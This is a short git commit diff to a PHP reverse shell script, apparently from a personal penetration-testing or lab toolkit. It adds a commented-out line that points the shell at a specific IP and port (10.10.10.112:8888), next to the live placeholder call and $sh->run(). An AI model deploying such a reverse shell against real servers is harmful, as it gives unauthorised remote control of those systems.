8bf7a7580ab864091407388a66b3e43519f90f7c
eugeneewe <eugeneewexen@gmail.com>
2024-02-23 16:48:14 +0800

    modified:   Reverse Shell/php-reverse-shell.php

--- Reverse Shell/php-reverse-shell.php
+++ Reverse Shell/php-reverse-shell.php
@@ -175,6 +175,7 @@ class Shell {
 echo '<pre>';
 // change the host address and/or port number as necessary
 $sh = new Shell('IP',PORT);
+//$sh = new Shell('10.10.10.112',8888);
 $sh->run();
 unset($sh);
 // garbage collector requires PHP v5.3.0 or greater
